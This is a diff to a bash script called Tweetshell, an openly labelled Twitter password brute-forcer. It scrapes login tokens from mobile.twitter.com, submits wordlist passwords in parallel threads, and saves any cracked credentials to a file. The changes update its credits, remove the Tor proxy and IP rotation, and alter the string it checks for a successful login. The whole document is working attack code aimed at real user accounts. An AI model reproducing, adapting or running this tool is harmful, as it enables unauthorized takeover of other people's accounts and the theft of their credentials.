@@ -1,9 +1,9 @@
 #!/bin/bash
-# Tweetshell v1.0
-# Coded by: github.com/thelinuxchoice
-# Instagram: @thelinuxchoice
+# Tweetshell v1.1
+# Coded by: github.com/thelinuxchoice/tweetshell
+# Twitter: @thelinuxchoice
 
-trap 'store;exit 1' 2
+trap '\nstore;exit 1' 2
 
 checkroot() {
 if [[ "$(id -u)" -ne 0 ]]; then
@@ -29,10 +29,10 @@ printf "\e[1;36m    _| || |_    | \ \ /\ / / _ \/ _ \ __\e[1;92m/ __| '_ \ / _ \
 printf "\e[1;36m   |_  __  _|   | |\ V  V /  __/  __/ |_\e[1;92m\__ \ | | |  __/ | | \e[0m\n"
 printf "\e[1;36m     |_||_|     \_/ \_/\_/ \___|\___|\__\e[1;92m|___/_| |_|\___|_|_| \e[0m\n"
 printf "\n"
-printf "\e[1;77m\e[44m Twitter BruteForcer v1.0 Author: thelinuxchoice (Github/IG)\e[0m\n"
+printf " \e[1;77m\e[44mTwitter BruteForcer v1.1, Coded by: @linux_choice (Twitter)\e[0m\n"
+printf " \e[1;77m[\e[0m\e[36m+\e[0m\e[1;77m] github.com/thelinuxchoice/tweetshell\e[0m\n"
 printf "\n"
 }
-
 function start() {
 banner
 checkroot
@@ -114,7 +114,7 @@ printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 token=0
 startline=1
 endline="$threads"
-changeip
+#changeip
 while [ $token -lt $count_pass ]; do
 IFS=$'\n'
 for password in $(sed -n ''$startline','$endline'p' $wl_pass); do
@@ -126,11 +126,11 @@ COOKIES='cookies'$countpass''
 let token++
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
 
-{(trap '' SIGINT && initpage=$(curl --socks5-hostname localhost:9050 -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"/account/login_verification"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/compose/tweet"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; fi; ) } & done; wait $!;
+{(trap '' SIGINT && initpage=$(curl  -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl   -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"If you’re not redirected soon"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/compose/tweet"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; fi; ) } & done; wait $!;
 
 let startline+=$threads
 let endline+=$threads
-changeip
+#changeip
 rm -rf cookies1
 rm -rf cookies$countpass
 done
@@ -140,7 +140,7 @@ exit 1
 function resume() {
 
 banner 
-checktor
+#checktor
 counter=1
 if [[ ! -d sessions ]]; then
 printf "\e[1;91m[*] No sessions\n\e[0m"
@@ -165,7 +165,7 @@ printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 
 
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
-changeip
+#changeip
 while [ $token -lt $count_pass ]; do
 IFS=$'\n'
 for password in $(sed -n '/\b'$password'\b/,'$(($token+threads))'p' $wl_pass); do
@@ -173,8 +173,8 @@ COOKIES='cookies'$countpass''
 countpass=$(grep -n -w "$password" "$wl_pass" | cut -d ":" -f1)
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
 let token++
-{(trap '' SIGINT && initpage=$(curl --socks5-hostname localhost:9050 -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"/account/login_verification"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/compose/tweet"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; fi; ) } & done; wait $!;
-changeip
+{(trap '' SIGINT && initpage=$(curl  -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"If you’re not redirected soon"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/compose/tweet"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; fi; ) } & done; wait $!;
+#changeip
 rm -rf cookies1
 rm -rf cookies$countpass
 done
